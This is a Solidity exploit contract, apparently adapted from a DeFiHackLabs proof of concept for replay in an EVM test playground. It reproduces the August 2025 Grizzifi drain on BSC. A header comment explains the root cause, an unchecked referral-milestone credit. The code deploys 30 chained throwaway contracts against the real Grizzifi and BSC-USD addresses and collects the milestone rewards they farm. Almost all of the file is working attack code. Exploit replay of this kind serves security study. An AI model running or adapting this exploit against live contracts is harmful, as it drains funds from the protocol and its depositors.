// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-08-Grizzifi).
// The DeFiHackLabs PoC deploys 30 throwaway helper contracts directly from the
// Foundry test contract itself (`new AttackContract1()` inside testExploit, with
// address(this) acting as the attacker/working-capital holder) — there is no
// single top-level "exploit" contract with an attack()/run() to deploy. This
// synthetic GrizzifiDrain plays the role of that test contract: it holds the
// pre-funded 600 BSC-USD "working capital" (seeded via the poc-config's
// setup.dealToken, mirroring the test's `deal(BSC_USD, address(this), 600 ether)`)
// and its run() reproduces the same three loops verbatim. AttackContract1 and
// AttackContract2 are copied unchanged from src/test/2025-08/Grizzifi_exp.sol.
//
// Root cause: Grizzifi._incrementUplineTeamCount() grants an upline one "team"
// credit for every downline registration as long as the upline's cumulative
// totalInvested (including amounts already withdrawn) is >= minInvestForMilestone
// (10 USDT) — with no proof of distinct humans and no economic cost tied to the
// reward size. A linear chain of 30 throwaway contracts, each depositing the 10
// USDT minimum twice (so every node also gets >= 2 "direct" referrals), walks
// every upline's teamsCount past the milestone thresholds and banks free
// milestone rewards via collectRefBonus().

address constant GRIZZIFI = 0x21ab8943380B752306aBF4D49C203B011A89266B;
address constant BSC_USD = 0x55d398326f99059fF775485246999027B3197955;

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IGrizzifi {
    function harvestHoney(uint256 _planId, uint256 _amount, address _referrer) external;
    function collectRefBonus() external;
}

contract GrizzifiDrain {
    address[] public attackContracts = new address[](30);

    // Plays the role of the Foundry test's `testExploit()`. The 600 BSC-USD
    // "working capital" is pre-seeded onto this contract by the poc-config's
    // setup.dealToken step before run() is invoked.
    function run() external {
        // Step 1: create 30 attack contracts and send 20 BSC-USD to each.
        for (uint256 i = 0; i < 30; i++) {
            AttackContract1 ac1 = new AttackContract1();
            attackContracts[i] = address(ac1);
            IERC20(BSC_USD).transfer(address(ac1), 20 ether);
        }

        // Step 2: run grizzifi.harvestHoney via each attack contract, chaining
        // referrals so every prior attack contract becomes the next one's upline.
        address regCenter = address(0);
        for (uint256 i = 0; i < 30; i++) {
            address ac1 = attackContracts[i];
            AttackContract1(ac1).init(GRIZZIFI, regCenter);
            regCenter = ac1;
        }

        // Step 3: withdraw the farmed milestone rewards back to this contract.
        for (uint256 i = 0; i < 30; i++) {
            // ignore the "Grizzifi: No referral or milestone bonuses to claim" revert
            try AttackContract1(attackContracts[i]).withdraw(GRIZZIFI) {
            } catch {
            }
        }
    }
}

contract AttackContract1 {
    function init(address owner, address regCenter) public {
        IERC20 bscUsd = IERC20(BSC_USD);
        IGrizzifi grizzifi = IGrizzifi(owner);

        bscUsd.approve(owner, type(uint256).max);
        grizzifi.harvestHoney(0, 10 ether, regCenter);

        AttackContract2 ac2 = new AttackContract2();
        bscUsd.transfer(address(ac2), 10 ether);
        ac2.run(BSC_USD, owner, regCenter);
    }

    function withdraw(address token) public {
        IGrizzifi(token).collectRefBonus();
        IERC20 bscUsd = IERC20(BSC_USD);
        bscUsd.transfer(msg.sender, bscUsd.balanceOf(address(this)));
    }
}

contract AttackContract2 {
    function run(address token, address router0, address router1) public {
        IERC20(token).approve(router0, type(uint256).max);
        IGrizzifi(router0).harvestHoney(0, 10 ether, router1);
    }
}
